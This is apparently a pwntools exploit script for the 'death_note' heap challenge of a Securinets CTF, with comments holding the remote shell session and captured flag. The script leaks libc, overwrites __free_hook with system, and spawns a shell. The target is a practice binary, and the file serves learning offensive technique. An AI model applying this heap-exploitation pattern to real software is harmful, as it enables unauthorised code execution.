#!/usr/bin/python

from pwn import *

PATH = './death_note'

GDBSCRIPT = '''
b *0x555555554bc1
b *0x555555554aef
'''

HOST = 'bin.q21.ctfsecurinets.com'
PORT = 1337

# $ id
# uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
# $ ls -la
# total 2032
# drwxr-xr-x 1 ctf  ctf     4096 Mar 20 19:42 .
# drwxr-xr-x 1 root root    4096 Mar 20 14:15 ..
# -rw------- 1 ctf  ctf       50 Mar 20 19:42 .bash_history
# -rw-r--r-- 1 ctf  ctf      220 Apr  4  2018 .bash_logout
# -rw-r--r-- 1 ctf  ctf     3771 Apr  4  2018 .bashrc
# -rw-r--r-- 1 ctf  ctf      807 Apr  4  2018 .profile
# -rwxrwxrwx 1 root root   10296 Sep 29 13:55 death_note
# -rwxrwxrwx 1 root root      91 Oct 16 14:06 flag
# -rwxr-xr-x 1 root root      50 Mar 20 19:17 launch.sh
# -rwxrwxrwx 1 root root 2030544 Mar 20 19:02 libc.so.6
# $ cat flag
# flag{this_has_gotta_be_the_longest_40_seconds_of_my_life_d543c7e3546b10c1d6ed0046db88787a}

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def create(size):
    r.sendlineafter('Exit\n', '1')
    r.sendlineafter(':', f'{size}')

def edit(idx, data):
    r.sendlineafter('Exit\n', '2')
    r.sendlineafter(':', f'{idx}')
    r.sendafter(': ', data)

def delete(idx):
    r.sendlineafter('Exit\n', '3')
    r.sendlineafter(': ', f'{idx}')

def view(idx):
    r.sendlineafter('Exit\n', '4')
    r.sendlineafter(':', f'{idx}')
    return r.recvline(0)

def exploit(r):
    for _ in range(8):
        create(0x80)
    
    create(0x20)

    for _ in range(8):
        delete(_)

    create(0x20)

    leak = u64(view(0).ljust(8, b'\0')) >> 8
    libc.address = leak - 0x3ebd20

    info(f'LIBC 0x{libc.address:x}')

    delete(0)
    edit(-59, p64(libc.sym['__free_hook']))

    create(0x80)
    create(0x80)

    edit(0, '/bin/sh\0')
    edit(1, p64(libc.sym['system']))

    delete(0)

    debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0, env={
            'LD_PRELOAD' : './libc.so.6'
        })
    exploit(r)